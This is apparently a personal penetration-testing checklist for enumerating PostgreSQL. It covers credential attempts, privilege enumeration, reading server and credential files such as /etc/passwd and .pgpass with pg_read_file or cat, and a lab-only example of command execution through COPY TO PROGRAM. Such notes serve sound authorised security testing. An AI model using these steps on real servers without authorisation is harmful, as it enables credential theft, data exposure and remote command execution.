# PostgreSQL enumeration

## Recognise and authenticate
sudo nmap -Pn -sV -p 5432 <TargetIP>
psql -h <TargetIP> -U postgres -d postgres
psql -h <TargetIP> -U '<Username>' -d postgres -W
- [ ] Trust authentication lets postgres in with no password; otherwise -W makes psql prompt before connecting
- [ ] The application's name and users found tried, with passwords typed at the prompt rather than put on the command line
- [ ] The exact server version through searchsploit postgresql, then :Pb public-exploits if there is a match

## Who I am and what is here
SELECT version();
SELECT current_user, session_user, current_database();
SELECT rolname, rolsuper, rolinherit, rolcreaterole, rolcreatedb, rolcanlogin, rolreplication, rolbypassrls FROM pg_roles;
\du+
SELECT datname, pg_get_userbyid(datdba) AS owner, datallowconn FROM pg_database;
\connect <Database>
SELECT schema_name, schema_owner FROM information_schema.schemata;
SELECT table_schema, table_name, table_type FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog', 'information_schema');
SELECT grantee, table_schema, table_name, privilege_type, is_grantable FROM information_schema.role_table_grants;
\dp
SELECT * FROM <Table> LIMIT 20;
- [ ] Role memberships in \du+, especially pg_read_all_data, pg_read_server_files and pg_execute_server_program
- [ ] Superuser, CREATEROLE, CREATEDB, REPLICATION and BYPASSRLS noted separately from ordinary table privileges
- [ ] Every database enumerated with \connect, not just the one named in the application's config
- [ ] Users, password hashes, tokens and connection strings in application tables tried on every other service

## Configuration and server files
SELECT name, setting, source, sourcefile, sourceline FROM pg_settings WHERE name IN ('data_directory', 'config_file', 'hba_file', 'ident_file', 'log_directory', 'log_filename', 'logging_collector');
- [ ] config_file, hba_file and ident_file can be outside data_directory: use the paths pg_settings gives
- [ ] pg_hba.conf rules explain which hosts, databases, roles and authentication methods are accepted
Only with superuser or pg_read_server_files, and the server's OS account able to read the file:
SELECT pg_read_file(current_setting('config_file'));
SELECT pg_read_file(current_setting('hba_file'));
SELECT pg_read_file('/etc/passwd');
The log listing needs superuser or pg_monitor; the file read keeps the same prerequisites as above:
SELECT pg_ls_logdir();
SELECT pg_read_file(current_setting('log_directory') || '/THE-LOG-FILE');
- [ ] postgresql.auto.conf and included files read as well as postgresql.conf; sourcefile and sourceline show where a setting came from
- [ ] Logs reviewed for roles, statements, connection strings and passwords; a relative log_directory is under the cluster directory

## Client history and saved passwords
On the target, in each user's own profile, not in my Kali home:
cat ~/.psql_history
cat ~/.pgpass
type "$env:APPDATA\postgresql\psql_history"
type "$env:APPDATA\postgresql\pgpass.conf"
- [ ] psql history gives databases, roles, queries and pasted secrets; HISTFILE or PSQL_HISTORY can move it
- [ ] pgpass lines are host:port:database:username:password, with backslash escaping for a colon or backslash

## Lab only: commands through COPY PROGRAM
Never on an exam or production box. First both role and OS prerequisites must hold: superuser or pg_execute_server_program, and the server's OS account able to run the command.
SELECT rolsuper, pg_has_role(current_user, 'pg_execute_server_program', 'member') AS may_execute FROM pg_roles WHERE rolname = current_user;
COPY (SELECT 'proof') TO PROGRAM 'id > /tmp/postgresql-proof';
- [ ] The command ran on the server as the PostgreSQL service account, not on Kali and not as root by default
- [ ] /tmp/postgresql-proof read through an existing shell, or with pg_read_file only if pg_read_server_files is also held
COPY (SELECT '') TO PROGRAM 'rm -f /tmp/postgresql-proof';
- [ ] Every file and process made for the lab removed; a reverse shell, when the lab allows it, is :Pb shells
